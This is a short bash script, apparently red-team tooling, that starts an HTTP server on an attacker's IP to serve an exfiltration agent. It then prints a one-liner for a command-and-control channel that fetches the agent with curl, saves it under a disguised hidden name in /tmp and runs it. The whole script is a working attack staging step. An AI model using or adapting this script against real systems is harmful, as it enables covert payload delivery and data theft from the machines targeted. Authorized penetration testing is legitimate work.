#!/bin/bash
# ============================================
# Red Team - Deploy Exfil Agent to Target
# Starts HTTP server and prints one-liner for C2
# ============================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AGENT_FILE="${SCRIPT_DIR}/exfil_agent.py"
ATTACKER_IP="${1:?Usage: ./deploy_agent.sh <ATTACKER_IP>}"
HTTP_PORT="${2:-8888}"

if [ ! -f "$AGENT_FILE" ]; then
    echo "[X] $AGENT_FILE not found"
    exit 1
fi

echo "[*] Starting HTTP server on port ${HTTP_PORT}..."
cd "$SCRIPT_DIR"
python3 -m http.server "$HTTP_PORT" --bind "$ATTACKER_IP" &>/dev/null &
HTTP_PID=$!
sleep 0.5

if ! kill -0 "$HTTP_PID" 2>/dev/null; then
    echo "[X] HTTP server failed to start (port ${HTTP_PORT} in use?)"
    exit 1
fi

echo "[+] HTTP server running (PID: ${HTTP_PID})"
echo ""
echo "[*] Paste this ONE command into C2:"
echo ""
echo "curl -s http://${ATTACKER_IP}:${HTTP_PORT}/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
echo ""
echo "[*] Press Enter after agent connects to stop HTTP server..."
read -r
kill "$HTTP_PID" 2>/dev/null
echo "[*] HTTP server stopped"
